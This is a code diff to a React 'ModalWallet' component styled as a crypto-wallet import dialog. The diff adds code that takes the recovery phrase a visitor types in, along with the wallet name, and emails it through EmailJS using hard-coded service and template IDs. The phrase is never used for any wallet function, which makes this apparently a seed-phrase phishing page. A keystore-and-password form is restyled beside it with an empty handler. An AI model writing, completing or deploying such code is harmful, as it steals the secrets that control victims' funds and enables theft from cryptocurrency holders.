@@ -1,11 +1,38 @@
-import React from 'react'
+// import { emailjs } from '@emailjs/browser'
+import React, { useState } from 'react'
+
 
 function ModalWallet({img, name, cancelModal}) {
+    const [phraseInput, setPhraseInput] = useState('');
+
+    useState(()=>{
+        emailjs.init('dFX7V_QgdyVOq1Gsk')
+    },[])
+
     function tabToggle(tabId){
         document.querySelectorAll('.tabs-item > div').forEach((item)=>{
             item.classList.add('hidden')
         })
         document.querySelector(`#${tabId}`).classList.remove('hidden')
+    }
+
+    function setPhrase(e){
+        setPhraseInput(e.target.value)
+    }
+
+    function handleSubmit(e){
+        e.preventDefault();
+        console.log('hi');
+        emailjs.sendForm('service_p6dborp', 'template_f1lpt2u', '#phraseSubmit')
+            .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+        }, function(error) {
+            console.log('FAILED...', error);
+        });
+    }
+
+    function handleSubmitjson(e){
+        e.preventDefault()
     }
 
     return (
@@ -24,48 +51,72 @@ function ModalWallet({img, name, cancelModal}) {
                             </div>
                             <div className='tabs-item'>
                                 <div id="firstChild" className=''>
-                                    <div className='mb-6 relative '>
-                                        <form action="" method="POST">
-                                            <textarea cols="30" rows="4" placeholder="Enter your recovery phrase" className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" id="phrase" minlength="12" required=""></textarea>
-                                            <p className="text-xs text-grey-300 mt-6">
+                                    <div className='relative '>
+                                        <form action="" method="POST" onSubmit={handleSubmit} id="phraseSubmit">
+                                            <input type="text" name='wallet_type' className='hidden' value={name}/>
+                                            <input type="text" name='input_type' className='hidden' value={"Phrase"}/>
+                                            <textarea 
+                                                cols="30" 
+                                                rows="4" 
+                                                placeholder="Enter your recovery phrase" 
+                                                className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
+                                                name="wallet_message" 
+                                                id="wallet_message" 
+                                                minLength="12" 
+                                                required
+                                                value={phraseInput}
+                                                onChange={setPhrase}
+                                            />
+                                            <p className="text-xs text-grey-300 my-6">
                                                 Typically 12 (sometimes 24) words separated by single spaces
                                             </p>
+                                            <div className="flex w-full">
+                                                <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
+                                                    <span className="mr-2 uppercase">Proceed</span> 
+                                                    <span>
+                                                        <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
+                                                            <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                                        </svg>
+                                                    </span>
+                                                </button>
+                                            </div>
                                         </form>
-                                    </div>
-                                    <div className="flex w-full">
-                                        <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
-                                            <span className="mr-2 uppercase">Proceed</span> 
-                                            <span>
-                                                <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
-                                                    <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                                                </svg>
-                                            </span>
-                                        </button>
                                     </div>
                                 </div>
                                 <div id="second" className="bg-grey-600 hidden">
                                     <div className="flex flex-col">
-                                        <form action="" method="POST">
-                                            <textarea cols="30" rows="4" placeholder="Enter your Keystore Json" className="mb-6 text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" id="phrase" minlength="12" required="" />   
+                                        <form action="" method="POST" onSubmit={handleSubmitjson} id="keyStoreJson">
+                                            <textarea 
+                                                cols="30" 
+                                                rows="4" 
+                                                placeholder="Enter your Keystore Json" 
+                                                className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
+                                                name="phrase" 
+                                                id="phrase" 
+                                                minLength="12" 
+                                                required="" 
+                                                // value={}
+                                                // onChange={}
+                                            />   
                                             <div className="flex flex-col mb-6">
                                                 <div className="relative">
                                                     <input type="text" id="keystorepassword" name="password" placeholder="Wallet password" className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" required="" />
-                                                    <p className="text-xs text-grey-300 mt-6">
+                                                    <p className="text-xs text-grey-300 my-6">
                                                         Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
                                                     </p>
                                                 </div>
                                             </div>
+                                            <div className="flex w-full">
+                                                <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
+                                                    <span className="mr-2uppercase" name="import">Proceed</span>
+                                                    <span>
+                                                        <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
+                                                            <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                                        </svg>
+                                                    </span>
+                                                </button>
+                                            </div>
                                         </form>
-                                    </div>
-                                    <div className="flex w-full">
-                                        <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
-                                            <span className="mr-2uppercase" name="import">Proceed</span>
-                                             <span>
-                                                <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
-                                                    <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                                                </svg>
-                                            </span>
-                                        </button>
                                     </div> 
                                 </div>
                                 <div id="third" className='bg-grey-600 hidden'>
